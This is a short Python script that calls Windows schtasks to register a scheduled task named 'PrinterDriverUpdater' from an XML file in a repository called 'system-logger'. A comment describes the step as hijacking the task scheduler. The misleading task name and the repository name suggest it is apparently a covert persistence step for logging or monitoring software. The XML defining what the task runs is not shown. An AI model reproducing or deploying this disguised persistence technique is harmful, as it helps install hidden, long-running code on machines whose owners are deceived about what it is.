from os import system

task = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"

#Hijacking task scheduler, kinda?
def Hijack():
    system(task)

if __name__ == "__main__":
    Hijack()